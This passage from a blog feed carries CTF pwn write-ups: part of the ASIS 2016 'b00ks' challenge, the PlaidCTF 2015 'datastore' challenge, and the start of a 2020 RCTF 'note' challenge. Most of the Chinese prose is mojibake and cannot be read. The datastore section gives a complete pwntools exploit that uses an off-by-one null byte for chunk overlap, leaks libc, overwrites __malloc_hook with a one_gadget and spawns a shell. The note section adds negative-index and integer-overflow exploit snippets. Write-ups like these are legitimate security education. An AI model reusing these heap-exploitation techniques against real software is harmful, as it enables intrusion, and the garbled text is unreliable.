·æŒ‡é’ˆç§»åŠ¨åˆ°äº†å‰é¢ï¼Œæˆ‘ä»¬å†æ¬¡ç¼–è¾‘book4å°±èƒ½ä¿®æ”¹book4çš„æè¿°æŒ‡é’ˆæŒ‡å‘å…¶ä»–æˆ‘ä»¬çš„å¯æ§åŒºåŸŸï¼Œæ¯”å¦‚è¿™é‡Œçš„book6çš„æè¿°æŒ‡é’ˆåŒºåŸŸã€‚é€šè¿‡ä¿®æ”¹book4çš„æè¿°å°±èƒ½æ§åˆ¶book6çš„æè¿°æŒ‡é’ˆï¼Œæ”¹å®Œä¹‹åç”¨æ‰“å°å°±èƒ½ä»»æ„è¯»æ•°æ®ï¼Œå¦‚æœå†ä¿®æ”¹book6çš„æè¿°å†…å®¹å°±æ˜¯ä»»æ„å†™ã€‚</p><p>æœ‰äº†ä»»æ„è¯»å†™ï¼Œè¿™é‡Œå°±è¿˜æ˜¯ä¸€æ ·çš„æ€è·¯å…ˆæ³„éœ²libcåœ°å€ï¼Œç„¶åæ‰¾<code>__free_hook</code>ï¼Œæˆ‘ä»¬åœ¨é‡Œé¢å†™å…¥<code>system</code>çš„åœ°å€ï¼Œæœ€åfreeæ‰book6ï¼Œå› ä¸ºbook6çš„åå­—éƒ¨åˆ†æ˜¯<code>/bin/sh</code>æ‰€ä»¥å°±èƒ½getshellã€‚</p><h2 id="datastore"><a href="#datastore" class="headerlink" title="datastore"></a>datastore</h2><p>è¿™ä¸ªæ˜¯2015 plaidctfçš„é¢˜ç›®ï¼Œä¸€å…±æœ‰å››ä¸ªæ“ä½œæŒ‡ä»¤GETã€PUTã€DUMPã€DELï¼Œå…¶ä¸­çš„æ•°æ®ç»“æ„é€†å‘è¾ƒä¸€èˆ¬çš„é¢˜ç›®è¦æ›´ä¸ºå¤æ‚ï¼Œæœ€æ ¸å¿ƒçš„æ˜¯ä¸€ä¸ªæ ‘ç»“æ„ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *key;</span><br><span class="line">    <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">char</span> *data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">right</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">parent</span>;</span></span><br><span class="line">    <span class="keyword">bool</span> is_leaf;</span><br></pre></td></tr></table></figure><p>æ•´ä¸ªé€†å‘çš„è¿‡ç¨‹æœ‰ç‚¹å¤æ‚ï¼Œé¦–å…ˆæ˜¯é€šè¿‡æ ‘èŠ‚ç‚¹ç¬¬ä¸€æ¬¡åˆå§‹åŒ–é‚£é‡Œå¤§æ¦‚èƒ½å¤Ÿåˆ¤æ–­å‡ºå‰é¢ä¸‰ä¸ªæˆå‘˜ï¼Œåé¢çš„å››ä¸ªç»“æ„æˆå‘˜éœ€è¦ç»“åˆDUMPå’ŒDELæ¥ç»¼åˆåˆ¤æ–­ã€‚ä»¥åé‡åˆ°è¿™ç§æ‹¥æœ‰å¾ˆå¤šæŒ‡é’ˆè€Œä¸”ç»å¸¸æœ‰è§„å¾‹æ”¹åŠ¨çš„æ•°æ®ç»“æ„å°±å¯ä»¥å¾€æ ‘çš„ç»“æ„çŒœæƒ³äº†ã€‚</p><p>ç„¶è€Œå¯¹ç¨‹åºæ•´ä½“åˆ†æä¹‹åå‘ç°ï¼Œæ¼æ´åˆ©ç”¨å’Œè¿™ä¸ªæ ‘ç»“æ„å…³ç³»ä¸å¤§ï¼Œæœ€é‡è¦çš„å…³ç³»æ˜¯å…¶ä¸­çš„å †åˆ†é…æ“ä½œï¼Œæœ‰ç‚¹è›‹ç–¼ã€‚ã€‚ã€‚è¿™ä¸ªç¨‹åºçš„æ¼æ´ç‚¹åœ¨è‡ªå®šä¹‰çš„ä¸€ä¸ªè¾“å…¥å‡½æ•°ä¸­ï¼ˆ0x1040ï¼‰ã€‚</p><img src="/2020/08/07/glibc-pwn-off-by-one-1/2.png"><p>æˆ‘ä»¬æŠŠchunkå¡«æ»¡çš„æ—¶å€™ï¼Œv1ä¼šæŒ‡å‘ä¸‹ä¸€å­—èŠ‚ï¼Œå¦‚æœè¿™ä¸ªæ—¶å€™æœ«å°¾æ˜¯<code>\n</code>ï¼Œå°±ä¼šé€€å‡ºå¾ªç¯å‘v1æŒ‡å‘çš„åœ°æ–¹å†™å…¥0ï¼Œè¿™å°±æº¢å‡ºäº†ä¸€ä¸ªnullå­—èŠ‚ã€‚</p><p>è¿™é“é¢˜å’Œä¸Šä¸€é“é¢˜ä¸ä¸€æ ·çš„åœ°æ–¹åœ¨äºæº¢å‡ºå‘¨å›´çš„æ•°æ®ä¸ä¸€æ ·ï¼Œä¸Šä¸€é“é¢˜èƒ½å¤Ÿæº¢å‡ºä¿®æ”¹æŒ‡é’ˆï¼Œä½†æ˜¯è¿™é“é¢˜åªèƒ½æº¢å‡ºåˆ°chunkç®¡ç†ç»“æ„ä¸­çš„sizeä¸Šã€‚ä¸è¿‡å°½ç®¡åªèƒ½æº¢å‡ºåˆ°sizeä¸Šè¿˜æ˜¯èƒ½å‘æŒ¥å‡ºå·¨å¤§çš„å¨åŠ›ï¼Œsizeä¸­çš„æœ€åä¸€ä½è¡¨ç¤ºä¸Šä¸ªchunkæ˜¯å¦åœ¨ä½¿ç”¨ï¼Œè¦†ç›–ä¹‹åå¯ä»¥è®©å †ç®¡ç†æ“ä½œåˆå¹¶å †å—æ„é€ å‡ºUAFçš„æƒ…å†µã€‚å…¶ä¸­çš„æ–¹æ³•é‡‡ç”¨çš„ctf-wikiçš„<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/#_9" target="_blank" rel="noopener">æ€è·¯</a>ã€‚</p><h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><p>ä¸ºäº†æ„é€ å‡ºæˆ‘ä»¬å¯æ§çš„å †å—é¡ºåºï¼Œé¦–å…ˆä¼šåˆ†é…å¾ˆå¤šdataå¤§å°ä¸º0x38çš„å—ï¼Œç„¶åå†é‡Šæ”¾æ‰ï¼Œè¿™æ ·ä¹‹åéœ€è¦åˆ†é…çš„æ—¶å€™å°±ä¼šä»fastbinä¸­è·å–ï¼Œè€Œä¸ä¼šç ´åæˆ‘ä»¬æ„é€ çš„å †å—é¡ºåºã€‚</p><p>ä¸ºäº†æ„é€ å‡ºchunk overlapçš„æƒ…å†µï¼Œéœ€è¦æœ‰å †å—åˆå¹¶ï¼Œæ‰€ä»¥åœ¨é¦–å°¾çš„å †å—å¿…é¡»è¦è¶…è¿‡fastbinçš„å¤§å°ï¼Œæœ€åçš„å †å—è¢«å½“åšæº¢å‡ºçš„å¯¹è±¡è¿˜éœ€è¦ä¿è¯å †å—å¤§å°ä¸º0x100çš„æ•´æ•°å€ï¼Œè¿™æ ·æº¢å‡ºè¦†ç›–ä¸ä¼šäº§ç”Ÿå…¶ä»–çš„å½±å“ã€‚</p><p>åœ¨è¿™ä¸¤ä¸ªå †å—ä¸­é—´éœ€è¦æœ‰ä¸ªå †å—æ‹¿æ¥æ³„éœ²libcåœ°å€ï¼Œç„¶åæœ‰ä¸ªå †å—æ‹¿æ¥ä½œä¸ºfastbin attackï¼Œæœ€åè¿˜æœ‰ä¸ªå †å—æ‹¿æ¥æº¢å‡ºåˆ°ä¸‹ä¸€å—ã€‚ï¼ˆåœ¨ctf-wikié‡Œé¢çš„è¯´æ³•å­˜åœ¨ä¸€ç‚¹é—®é¢˜ï¼Œæåˆ°ç”¨äºæº¢å‡ºçš„å—æ—¶è¯´éœ€è¦ä¸ºsmall binæˆ–è€…unsorted binçš„å †å—ï¼Œå…¶å®ä¸éœ€è¦è¿™ä¸ªé™åˆ¶ï¼Œåªè¦ä¿è¯ä¸è¢«0x20å’Œ0x40çš„å †å—å½±å“å°±è¡Œï¼Œæ‰€ä»¥è¿™é‡Œæ¢æˆ0x80çš„å †å—ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œç”³è¯·çš„å¤§å°ä¸º0x78ï¼‰</p><p>æœ€ç»ˆå®Œæ•´çš„å †å—æ„é€ å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+------------+</span><br><span class="line">|      1     |  &lt;-- free çš„ size == 0x200 chunk</span><br><span class="line">+------------+</span><br><span class="line">|      2     |  &lt;-- size == 0x60 fastbin chunkï¼Œå·²è¢«åˆ†é…ï¼Œä¸”å¯ä»¥è¯»å‡ºæ•°æ®</span><br><span class="line">+------------+</span><br><span class="line">|      5     |  &lt;-- size == 0x71 fastbin chunkï¼Œä¸º fastbin attack åšå‡†å¤‡</span><br><span class="line">+------------+</span><br><span class="line">|      3     |  &lt;-- size == 0x200 free çŠ¶æ€çš„ smallbin/unsortedbin chunk å¯å†™sizeä¸º0x1f8</span><br><span class="line">+------------+</span><br><span class="line">|      4     |  &lt;-- size == 0x101 è¢«æº¢å‡º chunk</span><br><span class="line">+------------+</span><br><span class="line">|      X     |  &lt;-- ä»»æ„åˆ†é…å chunk é˜²æ­¢ top åˆå¹¶</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p>å…ˆé€æ¬¡åˆ†é…ä¸Šé¢çš„å †å—ï¼Œæœ«å°¾çš„é˜²åˆå¹¶å †å—å¯ä»¥å°ä¸€ç‚¹å¦åˆ™small binå’Œunsorted binä¸­æ²¡æœ‰åˆé€‚çš„å †å—ä¼šè§¦å‘å †å—çš„æ•´åˆï¼Œç„¶åé‡Šæ”¾5ï¼Œ3ï¼Œ1ï¼Œéšåæº¢å‡ºä¿®æ”¹å †å—4çš„pre_sizeå’Œsizeï¼Œé‡Šæ”¾å †å—4ï¼Œè®©å‰é¢çš„1ï¼Œ2ï¼Œ5ï¼Œ3å’Œ4åˆå¹¶æˆä¸€ä¸ªå¤§å—æ”¾å…¥unsorted binä¸­ï¼Œæœ€åå†æ¬¡åˆ†é…0x200å¤§å°çš„å †å—ï¼Œunsorted binä¼šåœ¨å †å—2ä¸­å†™å…¥main_areançš„åœ°å€ï¼Œè¯»å‡º2ä¹‹åå¯ä»¥è·å¾—libcçš„åœ°å€ã€‚</p><h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><p>æˆ‘ä»¬æ‹¿åˆ°libcåœ°å€ä¹‹åï¼Œå†æ¬¡åˆ†é…ä¸€ä¸ªè¦†ç›–åŸæ¥å †å—2å’Œå †å—3çš„å¤§å°æ¯”å¦‚ï¼š0x100ï¼Œè¿™æ ·ä¿®æ”¹fastbinä¸­çš„fdæŒ‡é’ˆï¼ŒæŒ‡å‘æˆ‘ä»¬æƒ³è¦ä¼ªé€ çš„å †å—ï¼Œè¿™é‡Œé€‰æ‹©çš„æ˜¯<code>__malloc_hook</code>ï¼Œé€šè¿‡å°å¹…åº¦åç§»ä¼ªé€ æ­£å¸¸çš„å †å—ã€‚æœ€ç»ˆçš„åˆ©ç”¨å°±å¾ˆç®€å•äº†ï¼Œåˆ†é…ä¸¤æ¬¡0x60çš„å †å—ï¼Œåœ¨ç¬¬äºŒæ¬¡å†™å…¥one_gadgetåˆ°<code>__malloc_hook</code>ä¸­ï¼Œéšä¾¿è¾“å…¥ä¸€äº›æŒ‡ä»¤å°±èƒ½è§¦å‘mallocï¼Œæ‹¿åˆ°æœ€åçš„shellã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">'debug'</span>)</span><br><span class="line">io = process(<span class="string">'./datastore'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(key)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'command:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'GET'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'key:\n'</span>)</span><br><span class="line">    io.sendline(key)</span><br><span class="line">    io.recvuntil(<span class="string">'['</span>)</span><br><span class="line">    num = int(io.recvuntil(<span class="string">' byte'</span>, drop=<span class="keyword">True</span>))</span><br><span class="line">    io.recvuntil(<span class="string">':\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> io.recv(num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put</span><span class="params">(key, size, data)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'command:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'PUT'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'key:\n'</span>)</span><br><span class="line">    io.sendline(key)</span><br><span class="line">    io.recvuntil(<span class="string">'size:\n'</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">'data:\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> len(data) &lt; size:</span><br><span class="line">        io.send(data.ljust(size, <span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(key)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'command:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'DEL'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'key:\n'</span>)</span><br><span class="line">    io.sendline(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    put(str(i), <span class="number">0x38</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    delete(str(i))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">put(<span class="string">'1'</span>, <span class="number">0x200</span>, <span class="string">'1'</span>)</span><br><span class="line">put(<span class="string">'2'</span>, <span class="number">0x50</span>, <span class="string">'2'</span>)</span><br><span class="line">put(<span class="string">'5'</span>, <span class="number">0x68</span>, <span class="string">'5'</span>)</span><br><span class="line">put(<span class="string">'3'</span>, <span class="number">0x1f8</span>, <span class="string">'3'</span>)</span><br><span class="line">put(<span class="string">'4'</span>, <span class="number">0xf0</span>, <span class="string">'4'</span>)</span><br><span class="line">put(<span class="string">'defense'</span>, <span class="number">0x40</span>, <span class="string">'defense-data'</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># free those need to be freed</span></span><br><span class="line">delete(<span class="string">'5'</span>)</span><br><span class="line">delete(<span class="string">'3'</span>)</span><br><span class="line">delete(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">'a'</span> * <span class="number">0x1f0</span> + p64(<span class="number">0x4e0</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="string">'4'</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># put('0x200', 0x200, 'fillup')  # get another chunk 0x200</span></span><br><span class="line">put(<span class="string">'0x200 fillup'</span>, <span class="number">0x200</span>, <span class="string">'fillup again'</span>)</span><br><span class="line"></span><br><span class="line">libc_leak = u64(get(<span class="string">'2'</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">info(<span class="string">'libc leak: 0x%x'</span> % libc_leak)</span><br><span class="line"></span><br><span class="line">libc_base = libc_leak - <span class="number">0x3c4b78</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">'libc_base: 0x%x'</span> % libc_base)</span><br><span class="line"></span><br><span class="line">put(<span class="string">'fastatk'</span>, <span class="number">0x100</span>, <span class="string">'a'</span> * <span class="number">0x58</span> + p64(<span class="number">0x71</span>) + p64(libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x10</span> + <span class="number">5</span> - <span class="number">8</span>))  <span class="comment"># change fd</span></span><br><span class="line">put(<span class="string">'prepare'</span>, <span class="number">0x68</span>, <span class="string">'prepare data'</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">put(<span class="string">'attack'</span>, <span class="number">0x68</span>, <span class="string">'a'</span> * <span class="number">3</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">'DEL'</span>) <span class="comment"># malloc(8) triggers one_gadget</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="å…¶ä»–æ€è·¯"><a href="#å…¶ä»–æ€è·¯" class="headerlink" title="å…¶ä»–æ€è·¯"></a>å…¶ä»–æ€è·¯</h3><p><a href="https://0x3f97.github.io/pwn/2018/01/27/plaidctf2015-plaiddb/" target="_blank" rel="noopener">https://0x3f97.github.io/pwn/2018/01/27/plaidctf2015-plaiddb/</a></p><p>è¯¦ç»†ä¸€ç‚¹çš„æœ‰çœ‹é›ªçš„ä¸€ä¸ª<a href="https://bbs.pediy.com/thread-246966.htm" target="_blank" rel="noopener">å¸–å­</a>å’Œå…ˆçŸ¥ç¤¾åŒºçš„<a href="https://xz.aliyun.com/t/6169#toc-3" target="_blank" rel="noopener">å¸–å­</a></p><p>è¿™ä¸ªåšæ³•æ›´åŠ å¤æ‚ï¼Œæ²¡æœ‰åƒä¸Šé¢çš„åšæ³•å…ˆé‡Šæ”¾å¾ˆå¤šå †å—æ‹¿æ¥å½“åšæ ‘ç»“æ„å †å—ï¼Œè¿™æ ·å°±è¦è€ƒè™‘åˆ°æ¯æ¬¡æ ‘ç»“æ„çš„åˆ†é…å¯¹å †å—å¸ƒå±€çš„å½±å“ï¼Œå¹¶ä¸”æœ€ååœ¨è¦†ç›–çš„æ—¶å€™éœ€è¦è€ƒè™‘ä¸ç ´åä¹‹å‰å †ä¸Šçš„æ•°æ®ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>off by oneçš„åˆ©ç”¨æ€»çš„æ¥è¯´æ€è·¯æœ‰ï¼š</p><ol><li>å¦‚æœèƒ½ä¿®æ”¹åˆ°æŒ‡é’ˆï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•æ„é€ unlinkå’Œä»»æ„è¯»å†™</li><li>å¦‚æœåªèƒ½ä¿®æ”¹å †å—çš„sizeï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•chunk overlap</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;b00ks&quot;&gt;&lt;a href=&quot;#b00ks&quot; class=&quot;headerlink&quot; title=&quot;b00ks&quot;&gt;&lt;/a&gt;b00ks&lt;/h2&gt;&lt;p&gt;è¿™æ˜¯ä¸€é“asis ctf 2016çš„é¢˜ç›®ï¼Œä¸»è¦åŠŸèƒ½æ˜¯ä¹¦æœ¬è®°å½•ï¼Œé™¤äº†åŸºæœ¬çš„ä¹¦æœ¬çš„å¢åˆ æ”¹æŸ¥åŠŸèƒ½ï¼Œè¿˜æœ‰ä¸€ä¸ªä½œè€…åç§°çš„æ”¹å˜ã€‚
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="heap" scheme="https://hurricane618.me/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>2020RCTF å‡ é“pwné¢˜çš„å¤ç°</title>
    <link href="https://hurricane618.me/2020/08/01/2020rctf-some-pwn/"/>
    <id>https://hurricane618.me/2020/08/01/2020rctf-some-pwn/</id>
    <published>2020-08-01T06:29:06.000Z</published>
    <updated>2020-10-12T01:24:17.406Z</updated>
    
    <content type="html"><![CDATA[<p>åšå®¢é•¿è‰ä¸¥é‡ï¼Œä¸ŠåŠå¹´æ‘¸é±¼å¤ªä¹…ã€‚æœ€è¿‘è¶ç€æœ‰ç©ºå¼€å§‹å¤ç°ä¹‹å‰çš„ä¸€äº›é¢˜ç›®ï¼Œè¿™æ¬¡åšäº†2020RCTFçš„å‡ é“pwné¢˜ï¼Œæœ¬æ¥è¿˜æƒ³ç€æŠŠMIPSé‚£é“é¢˜åšå‡ºæ¥å†å‘ï¼Œç»“æœå‘ç°MIPSçš„è°ƒè¯•è¿˜æœ‰å¾ˆå¤šé—®é¢˜ï¼Œæ‰€ä»¥å°±å…ˆå‘å¸¸è§„ä¸€ç‚¹çš„é¢˜ã€‚</p><h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><p>æœ€ç»å…¸çš„èœå•å †é¢˜ï¼Œè¿˜æ˜¯noteç®¡ç†ç³»ç»Ÿã€‚64ä½ç¨‹åºï¼Œä¿æŠ¤å…¨å¼€ã€‚ä¸»è¦åŠŸèƒ½æœ‰newï¼Œsellï¼Œshowï¼Œeditï¼Œç»å…¸çš„å¢åˆ æŸ¥æ”¹ï¼Œé™¤äº†åŸºæœ¬åŠŸèƒ½ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸¤ä¸ªé¢å¤–çš„åŠŸèƒ½ï¼Œä¸€ä¸ªæ˜¯<code>super note</code>ï¼Œä¸€ä¸ªæ˜¯è¶Šç•Œå†™æ•°æ®ä½†æ˜¯åªèƒ½æ“ä½œä¸€æ¬¡ã€‚</p><p>è¿™ä¸ªé¢˜çš„<code>super note</code>æ˜¯ä¸ªå¹Œå­ï¼Œæœ€åå®Œå…¨æ²¡æœ‰ç”¨åˆ°ã€‚å®ƒçš„æ•°æ®ç»“æ„æ˜¯ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼Œå¼€å¤´æ˜¯ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬ç”³è¯·çš„messageåŒºåŸŸï¼Œç¬¬äºŒå—æ˜¯sizeï¼Œè¡¨ç¤ºmessageçš„å¤§å°ï¼Œç¬¬ä¸‰å—æ˜¯è¡¨ç¤ºmoneyã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+---------------+-----------&gt;+-------------+</span><br><span class="line">|     ptr       |            |             |</span><br><span class="line">|               |            |   message   |</span><br><span class="line">+---------------+            |             |</span><br><span class="line">|     size      |            +-------------+</span><br><span class="line">|               |</span><br><span class="line">+---------------+</span><br><span class="line">|     money     |</span><br><span class="line">|               |</span><br><span class="line">+---------------+</span><br></pre></td></tr></table></figure><h3 id="ç»•è¿‡moneyçš„é™åˆ¶"><a href="#ç»•è¿‡moneyçš„é™åˆ¶" class="headerlink" title="ç»•è¿‡moneyçš„é™åˆ¶"></a>ç»•è¿‡moneyçš„é™åˆ¶</h3><p>è¿™é‡Œåˆ©ç”¨äº†å®ƒçš„indexå¯ä»¥ä¸ºè´Ÿæ•°çš„é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥å‘å‰ä¿®æ”¹æ•°æ®ï¼Œå¹¶ä¸”æ°å·§åœ¨index=-5æ—¶ptrçš„ä½ç½®å¤„æœ‰ä¸€ä¸ªæŒ‡é’ˆï¼Œå®ƒæŒ‡å‘è‡ªå·±åœ°å€ï¼ŒåŒæ—¶åœ¨å®ƒçš„åé¢æœ‰å­˜å‚¨ç€moneyçš„å˜é‡åœ°å€ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç¼–è¾‘ä¸‹æ ‡ä¸º-5çš„åœ°æ–¹ï¼Œè¾“å…¥æˆ‘ä»¬çš„å€¼æŠŠmoneyå˜å¤§ç»•è¿‡åˆ†é…noteçš„é™åˆ¶ã€‚</p><p><code>edit(-5,&#39;a&#39;*8 + p64(0xfffffffffffffff) + &#39;\x01&#39;)</code></p><p>ç”±äºåˆ†é…å†…å­˜éœ€è¦æ¶ˆè€—<code>size*857</code>çš„é’±ï¼Œå‡ºå”®åªèƒ½å¾—åˆ°<code>size*64</code>çš„é’±ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜æœ‰å¦å¤–ä¸€ç§ç»•è¿‡çš„æ–¹æ³•ï¼Œåˆ©ç”¨äº†å¯„å­˜å™¨æº¢å‡ºçš„é—®é¢˜ï¼Œæˆ‘ä»¬ç»™ä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼Œè¿™ä¸ªæ•°<code>n</code>èƒ½å¤Ÿæ»¡è¶³<code>n*857</code>æº¢å‡ºï¼Œ<code>n*64</code>ä¸ä¼šæº¢å‡ºï¼Œè¿™æ ·æˆ‘ä»¬åœ¨ç”¨<code>money</code>æ¯”è¾ƒ<code>n*857</code>å°±èƒ½é€šè¿‡ï¼Œä½†æ˜¯åœ¨å‡ºå”®çš„æ—¶å€™å´æ²¡æœ‰æº¢å‡ºï¼Œè¿™ä¸ªæ•°å°±ä¼šå¾ˆå¤§ï¼Œå‡ºå”®å¾—åˆ°çš„é’±è¶³å¤Ÿæˆ‘ä»¬ä½¿ç”¨ã€‚</p><p><code>new(0, 21524788884141834) sell(0)</code></p><h3 id="chunk-overlap"><a href="#chunk-overlap" class="headerlink" title="chunk overlap"></a>chunk overlap</h3><p>å› ä¸ºæˆ‘ä»¬æœ‰ä¸€æ¬¡è¶Šç•Œå†™çš„æœºä¼šï¼Œæ‰€ä»¥èƒ½è½»æ¾çš„ä¿®æ”¹æ‰chunkçš„sizeåŒºåŸŸå®ç°overlapã€‚</p><p>ç”±äºæœ‰tcacheçš„å­˜åœ¨ï¼Œæˆ‘ä»¬éœ€è¦åˆ†é…è¶…è¿‡<code>small bin</code>å¤§å°çš„chunké‡Šæ”¾åæ‰èƒ½è¿›å…¥<code>unsorted bin</code>ã€‚æˆ‘ä»¬åœ¨å¤´éƒ¨å’Œå°¾éƒ¨åˆ†é…å°chunkï¼Œå¤´éƒ¨chunkæ‹¿æ¥æº¢å‡ºï¼Œå°¾éƒ¨chunkä¸ºäº†é¿å…å’Œ<code>top chunk</code>åˆå¹¶ã€‚æº¢å‡ºä¿®æ”¹sizeä¹‹åé‡Šæ”¾ï¼Œå°±ä¼šè¿›å…¥<code>unsorted bin</code>ï¼Œå®ƒçš„<code>fd</code>å’Œ<code>bk</code>æŒ‡é’ˆä¼šæŒ‡å‘<code>main_arena</code>åŒºåŸŸï¼Œéšåæˆ‘ä»¬åˆ†é…å®ƒåŸå§‹å¤§å°çš„chunkï¼Œè¿™æ 